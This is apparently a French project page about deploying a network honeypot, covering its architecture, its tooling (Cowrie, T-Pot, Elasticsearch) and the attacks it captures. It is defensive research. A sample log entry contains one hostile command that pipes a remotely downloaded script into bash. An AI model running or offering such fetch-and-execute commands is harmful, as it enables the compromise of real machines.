---
titre: HoneyPot
description: Déploiement d'un pot de miel réseau pour capturer, analyser et documenter les techniques d'attaque automatisées et les campagnes de scan malveillantes.
date: 2025-03-01
tags: [honeypot, sécurité, réseau, threat-intelligence, linux]
---

## Qu'est-ce qu'un honeypot ?

Un **pot de miel** (*honeypot*) est un système délibérément exposé, conçu pour attirer les attaquants. Il ne contient aucune donnée réelle et n'a aucune valeur opérationnelle : toute connexion entrante est par définition suspecte.

L'intérêt est double :
- **Passif** : observer ce que font les bots et attaquants dans la nature sans risquer un système de production
- **Actif** : collecter des indicateurs de compromission (IOC) pour enrichir les règles de détection

## Ce qu'on observe

Depuis le déploiement du honeypot, on capture notamment :

- Scans de ports massifs (Shodan, Censys, bots privés)
- Tentatives de bruteforce SSH (dictionnaires d'identifiants courants)
- Exploitation de failles connues (Log4Shell, Shellshock, etc.)
- Téléchargement de droppers et de mineurs de cryptomonnaie
- Tentatives de pivotement après compromission initiale

## Architecture

```
Internet
   │
[VPS exposé — IP publique]
   │
[Honeypot services]
   ├── SSH  (Cowrie)     → port 22
   ├── HTTP (Nginx leurre) → port 80/443
   ├── FTP  (émulé)      → port 21
   └── Telnet            → port 23
   │
[Collecte & analyse]
   ├── Logs Cowrie (sessions complètes rejouables)
   ├── Captures réseau (tcpdump / Wireshark)
   └── Export vers SIEM (Elasticsearch)
```

## Stack technique

- **Cowrie** — honeypot SSH/Telnet interactif qui enregistre chaque session
- **T-Pot CE** — plateforme multi-honeypot (Dionaea, Glutton, Heralding…)
- **Elasticsearch + Kibana** — stockage et visualisation des événements
- **Fail2ban** — protection du système hôte lui-même
- **GeoIP** — cartographie des origines des attaques

## Exemples de données collectées

```json
{
  "timestamp": "2025-03-12T03:14:07Z",
  "src_ip": "185.x.x.x",
  "country": "RU",
  "service": "SSH",
  "username": "root",
  "password": "admin123",
  "command": "curl -s http://x.x.x/payload.sh | bash"
}
```

## Résultats notables

- Première connexion : **< 4 minutes** après mise en ligne du VPS
- ~**2 000 tentatives SSH/jour** en moyenne
- Payload le plus fréquent : miner XMRig ciblant les CPU libres

## État du projet

En production continue. Les données anonymisées alimentent nos présentations lors des conférences internes et des réunions de l'association.
